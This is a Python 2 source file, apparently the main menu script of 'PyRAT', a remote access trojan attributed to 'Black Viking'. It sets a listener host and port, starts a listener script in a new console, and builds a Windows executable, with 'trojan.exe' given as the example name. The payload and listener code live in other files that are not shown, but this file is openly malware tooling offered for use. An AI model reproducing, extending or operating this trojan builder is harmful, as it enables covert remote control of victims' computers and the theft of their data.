#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

__author__ = "Black Viking"
__date__   = "15.04.2017"

import os
import sys
from time import *
from colorama import init
from colorama import Fore, Back, Style
from subprocess import Popen, CREATE_NEW_CONSOLE

reload(sys)
sys.setdefaultencoding("utf-8")

green = Fore.GREEN
yellow = Fore.YELLOW
red = Fore.RED
blue = Fore.CYAN
white = Fore.WHITE
bright = Style.BRIGHT

host = " "
port = " "

def logo():
    logo = blue + """ 
%s$$$$$$$\            $$$$$$$\   $$$$$$\ $$$$$$$$\       
$$  __$$\           $$  __$$\ $$  __$$\\__$$  __|      
$$ |  $$ |$$\   $$\ $$ |  $$ |$$ /  $$ |  $$ |         
$$$$$$$  |$$ |  $$ |$$$$$$$  |$$$$$$$$ |  $$ |         
$$  ____/ $$ |  $$ |$$  __$$< $$  __$$ |  $$ |         
$$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |         
$$ |      \$$$$$$$ |$$ |  $$ |$$ |  $$ |  $$ |         
\__|       \____$$ |\__|  \__|\__|  \__|  \__|         
          $$\   $$ |                                   
          \$$$$$$  |                           
           \______/                           


\t%s%s[>]--->       PyRAT Project      <---[<]%s
\t[>]--->       Version: 1.0       <---[<]
\t[>]--->   github.com/blackvkng   <---[<]
\t[>]--->       %sBlack Viking%s       <---[<]
"""%(Style.BRIGHT, red, Style.BRIGHT, Style.NORMAL, Style.BRIGHT, Style.NORMAL)
    print logo
    help()
    print bright + white + "="*80

def help():
    print bright + yellow + """
Commands:
    set HOST           : Set HOST value.
    set PORT           : Set PORT value.
    settings           : Show HOST and PORT values.
    start listener     : Start Listener.

Example:
    >>> PyRAT ==> set HOST 127.0.0.1
    >>> PyRAT ==> set PORT 8000
    >>> PyRAT ==> show listener
[~] HOST: 127.0.0.1
[~] PORT: 8000
===========================================================
    >>> PyRAT ==> start listener / start / run

#---- Generating exe files(Windows)
    
    >>> PyRAT ==> set HOST 127.0.0.1
    >>> PyRAT ==> set PORT 8000
    >>> PyRAT ==> show listener
[~] HOST: 127.0.0.1
[~] PORT: 8000
===========================================================
    >>> PyRAT ==> generate exec --name trojan.exe"""
    

#-----------------   Main Function   -----------------#

def main():
    global host, port

    while True:
        pyrat = raw_input(bright+red+"PyRAT %s==%s> "%(Style.NORMAL, bright)).lower()

        if pyrat == "help":
            help()

        elif "set host" in pyrat:
            host = pyrat.split()[-1]

        elif "set port" in pyrat:
            port = int(pyrat.split()[-1])

        elif pyrat == "show listener":
            print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60

        elif pyrat == "start" or pyrat == "run" or pyrat == "start listener":
            if host != " " and port != " ":
                Popen([sys.executable, 'source/listener.py', host, str(port)], creationflags=CREATE_NEW_CONSOLE)
            else:
                print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60

        elif "generate exec --name" in pyrat:
            if host != " " and port != " ":
                name = pyrat.split()[-1]
                if name != "":
                    Popen([sys.executable, 'source/generate_exec.py', host, str(port), name], creationflags=CREATE_NEW_CONSOLE)
                else:
                    pass
            else:
                print "[~] Host: %s\n[~] Port: %s\n"%(host, port)+"="*60



if __name__ == "__main__":
    init(autoreset=True)
    logo()
    main()
